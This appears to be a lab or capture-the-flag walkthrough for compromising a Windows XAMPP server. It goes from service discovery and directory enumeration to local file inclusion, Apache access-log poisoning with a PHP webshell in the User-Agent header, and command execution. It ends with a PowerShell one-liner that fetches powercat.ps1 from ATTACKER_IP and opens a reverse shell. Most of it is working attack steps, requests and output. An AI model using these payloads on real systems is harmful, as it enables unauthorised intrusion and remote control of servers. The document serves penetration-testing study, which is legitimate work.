# XAMPP

Windows XAMPP can expose Apache/PHP on alternate ports. If a PHP page includes a user-controlled `page` parameter, use LFI to read files and poison Apache logs for command execution.

## Discovery

Useful service indicators:

```text
21/tcp   open  ftp    FileZilla ftpd 0.9.41 beta
3306/tcp open  mysql  MariaDB 10.3.24 or later
4443/tcp open  http   Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
8080/tcp open  http   Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
```

WhatWeb may show XAMPP and PHP:

```text
Apache[2.4.43], HTTPServer[Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6], PHP[7.4.6], RedirectLocation[/dashboard/], X-Powered-By[PHP/7.4.6]
```

Useful paths:

```text
http://TARGET:8080/dashboard/
http://TARGET:8080/dashboard/phpinfo.php
http://TARGET:8080/phpmyadmin/
```

## Directory Enumeration

Use `-n` because the server may redirect or behave noisily:

```bash
feroxbuster -u http://TARGET:8080 -n -x php -Eg -t 10 -w /md/wl/raft-small-directories.txt
```

Useful hits:

```text
301  http://TARGET:8080/site => http://TARGET:8080/site/
301  http://TARGET:8080/xampp => http://TARGET:8080/xampp/
403  http://TARGET:8080/phpmyadmin
```

The application path was:

```text
http://TARGET:8080/site/index.php?page=main.php
```

## LFI

Test Windows file read through the `page` parameter:

```text
http://TARGET:8080/site/index.php?page=../../../../../../../../../windows/system32/drivers/etc/hosts
```

The working Apache access log path was:

```text
/xampp/apache/logs/access.log
```

Confirm the LFI can read it:

```text
http://TARGET:8080/site/index.php?page=../../../../../../../../../xampp/apache/logs/access.log
```

## Log Poisoning RCE

Send a request with a PHP webshell in the `User-Agent` header:

```http
GET /site/index.php?page=main.php HTTP/1.1
Host: TARGET:8080
User-Agent: <?php echo system($_GET['cmd']); ?>
```

Trigger command execution by including the poisoned access log:

```text
http://TARGET:8080/site/index.php?page=../../../../../../../xampp/apache/logs/access.log&cmd=whoami
```

Successful command execution:

```text
slort\rupert
```

Working directory:

```text
cmd=dir
C:\xampp\htdocs\site
```

## Reverse Shell

Use PowerShell to download and execute `powercat.ps1`:

```powershell
powershell.exe -nop -ep bypass -w hidden -c "IEX (New-Object System.Net.WebClient).DownloadString('http://ATTACKER_IP:8000/powercat.ps1'); powercat -c ATTACKER_IP -p 80 -e powershell"
```

URL-encode the command and pass it through the poisoned log webshell:

```text
/site/index.php?page=../../../../../../../xampp/apache/logs/access.log&cmd=URL_ENCODED_POWERCAT_COMMAND
```

Successful shell:

```text
connect to [ATTACKER_IP] from (UNKNOWN) [TARGET] PORT
Windows PowerShell
PS C:\xampp\htdocs\site>
```

Confirm context:

```powershell
whoami /all
```

Observed user:

```text
slort\rupert
```
